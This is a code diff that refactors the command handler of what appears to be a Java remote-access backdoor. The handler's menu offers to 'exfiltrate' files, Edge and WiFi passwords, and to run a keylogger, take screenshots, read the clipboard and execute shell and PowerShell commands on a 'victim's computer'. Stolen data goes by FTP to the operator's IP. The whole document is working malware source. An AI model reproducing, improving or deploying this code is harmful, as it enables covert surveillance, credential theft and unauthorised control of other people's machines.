@@ -25,48 +25,48 @@ public class HandleCommand {
 	/**
 	 * Handles command.
 	 * <p>
-	 * Handles command {@link command} and sets {@link send} to an appropriate
+	 * Handles command {@code command} and sets {@code send} to an appropriate
 	 * response. Uses {@link Backdoor#out} to send the response followed by a token
 	 * to signal the end of the response.
 	 *
 	 * @param command command given to the backdoor
 	 */
 	public static void handle(String command) {
-		String send = "";
+		StringBuilder send = new StringBuilder();
 		if (command.equals("help"))
-			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
+			send = new StringBuilder("[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
 					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
 					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
 					+ "[zip] Compress a directory to a ZIP file\n[unzip] Decompress a ZIP file\n"
-					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
+					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit");
 		else if (command.startsWith("cmd"))
-			send = Utils.runCommand(command.substring(4));
+			send = new StringBuilder(Utils.runCommand(command.substring(4)));
 		else if (command.startsWith("ps") || command.startsWith("ds")) {
 			File file = new File(command.substring(3));
 			try {
 				if (command.startsWith("ps") && file.exists())
-					send = Utils.runPSScript(command.substring(3));
+					send = new StringBuilder(Utils.runPSScript(command.substring(3)));
 				else if (command.startsWith("ds") && file.exists() && DuckyScripts.run(command.substring(3)))
-					send = "DuckyScript successfully executed";
+					send = new StringBuilder("DuckyScript successfully executed");
 				else
 					throw new Exception();
 			} catch (Exception e) {
-				send = "An error occurred when trying to execute script";
+				send = new StringBuilder("An error occurred when trying to execute script");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			} finally {
 				try {
 					FileUtils.forceDelete(file);
-				} catch (Exception e) {
+				} catch (Exception ignored) {
 				}
 			}
 		} else if (command.startsWith("exfiles")) {
 			File exfiltratedFiles = new File(Backdoor.gatheredDir + "ExfiltratedFiles");
 			try {
 				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
-						new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
+						new ArrayList<>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
 				Utils.zipDir(exfiltratedFiles.getAbsolutePath());
 				FTP.backdoor(exfiltratedFiles.getAbsolutePath() + ".zip", "send", Backdoor.ip);
 				while (!FTP.socketTransferDone && FTP.error == null)
@@ -78,16 +78,16 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				send = "Files exfiltrated";
+				send = new StringBuilder("Files exfiltrated");
 			} catch (Exception e) {
-				send = "An error occurred when trying to exfiltrate files";
+				send = new StringBuilder("An error occurred when trying to exfiltrate files");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			} finally {
 				try {
 					FileUtils.forceDelete(exfiltratedFiles);
 					FileUtils.forceDelete(new File(exfiltratedFiles.getAbsolutePath() + ".zip"));
-				} catch (Exception e) {
+				} catch (Exception ignored) {
 				}
 			}
 		} else if (command.equals("expass")) {
@@ -119,26 +119,26 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				send = "Passwords exfiltrated";
+				send = new StringBuilder("Passwords exfiltrated");
 			} catch (Exception e) {
-				send = "An error occurred when trying to exfiltrate passwords";
+				send = new StringBuilder("An error occurred when trying to exfiltrate passwords");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			} finally {
 				try {
 					FileUtils.forceDelete(exfiltratedPasswords);
 					FileUtils.forceDelete(new File(exfiltratedPasswords.getAbsolutePath() + ".zip"));
-				} catch (Exception e) {
+				} catch (Exception ignored) {
 				}
 			}
 		} else if (command.startsWith("filetype")) {
 			File file = new File(command.substring(9));
 			if (file.isFile())
-				send = "file";
+				send = new StringBuilder("file");
 			else if (file.isDirectory())
-				send = "directory";
+				send = new StringBuilder("directory");
 			else
-				send = "not real";
+				send = new StringBuilder("not real");
 		} else if (command.startsWith("filesend")) {
 			try {
 				FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
@@ -151,11 +151,11 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				send = "File sent";
+				send = new StringBuilder("File sent");
 			} catch (Exception e) {
-				send = "An error occurred when trying to send file";
+				send = new StringBuilder("An error occurred when trying to send file");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		} else if (command.startsWith("filerec")) {
 			File file = new File(command.substring(8));
@@ -176,26 +176,22 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				send = "File received";
+				send = new StringBuilder("File received");
 			} catch (Exception e) {
-				send = "An error occurred when trying to receive file";
+				send = new StringBuilder("An error occurred when trying to receive file");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			} finally {
 				try {
 					if (file.isDirectory())
 						FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
-				} catch (Exception e) {
+				} catch (Exception ignored) {
 				}
 			}
 		} else if (command.startsWith("keylog")) {
-			Thread keyLogger = new Thread() {
-				public void run() {
-					KeyLogger.start(command.substring(7));
-				}
-			};
+			Thread keyLogger = new Thread(() -> KeyLogger.start(command.substring(7)));
 			keyLogger.start();
-			send = "Keys are being logged to '" + command.substring(7) + "\\keys.log' on victim's computer";
+			send = new StringBuilder("Keys are being logged to '" + command.substring(7) + "\\keys.log' on victim's computer");
 		} else if (command.equals("ss")) {
 			File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
 			try {
@@ -212,15 +208,15 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				send = "Screenshot received";
+				send = new StringBuilder("Screenshot received");
 			} catch (Exception e) {
-				send = "An error occurred when trying to receive screenshot";
+				send = new StringBuilder("An error occurred when trying to receive screenshot");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			} finally {
 				try {
 					FileUtils.forceDelete(screenshot);
-				} catch (IOException e) {
+				} catch (IOException ignored) {
 				}
 			}
 		} else if (command.equals("cb"))
@@ -228,24 +224,24 @@ public class HandleCommand {
 				String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
 						.getData(DataFlavor.stringFlavor);
 				if (clipBoard.isEmpty())
-					send = "Nothing copied to victim's clipboard";
+					send = new StringBuilder("Nothing copied to victim's clipboard");
 				else
-					send = "Victim's clipboard:\n" + clipBoard;
+					send = new StringBuilder("Victim's clipboard:\n" + clipBoard);
 			} catch (Exception e) {
-				send = "An error occurred when trying to get victim's clipboard";
+				send = new StringBuilder("An error occurred when trying to get victim's clipboard");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		else if (command.startsWith("cat"))
 			try {
 				Scanner in = new Scanner(new File(command.substring(4)));
 				while (in.hasNextLine())
-					send += in.nextLine() + "\n";
+					send.append(in.nextLine()).append("\n");
 				in.close();
 			} catch (Exception e) {
-				send = "An error occurred when trying to get file";
+				send = new StringBuilder("An error occurred when trying to get file");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		else if (command.startsWith("zip"))
 			try {
@@ -253,20 +249,20 @@ public class HandleCommand {
 				if (!dir.isDirectory())
 					throw new Exception("Not a directory");
 				Utils.zipDir(dir.getAbsolutePath());
-				send = "Directory compressed to '" + dir.getAbsolutePath() + ".zip'";
+				send = new StringBuilder("Directory compressed to '" + dir.getAbsolutePath() + ".zip'");
 			} catch (Exception e) {
-				send = "An error occurred when compressing directory";
+				send = new StringBuilder("An error occurred when compressing directory");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		else if (command.startsWith("unzip"))
 			try {
 				String output = Utils.unzip(command.substring(6));
-				send = "Contents of ZIP file decompressed to '" + output + "'";
+				send = new StringBuilder("Contents of ZIP file decompressed to '" + output + "'");
 			} catch (Exception e) {
-				send = "An error occurred when decompressing directory";
+				send = new StringBuilder("An error occurred when decompressing directory");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		else if (command.equals("remove"))
 			try {
@@ -274,12 +270,12 @@ public class HandleCommand {
 						+ Backdoor.gatheredDir + " jre");
 				System.exit(0);
 			} catch (Exception e) {
-				send = "An error occurred when trying to remove files";
+				send = new StringBuilder("An error occurred when trying to remove files");
 				if (e.getMessage() != null)
-					send += ":\n" + e.getMessage();
+					send.append(":\n").append(e.getMessage());
 			}
 		else if (!command.isEmpty())
-			send = "Command not found";
-		Backdoor.out.println(send + "\n!$end$!");
+			send = new StringBuilder("Command not found");
+		Backdoor.out.println(send.toString() + "\n!$end$!");
 	}
 }
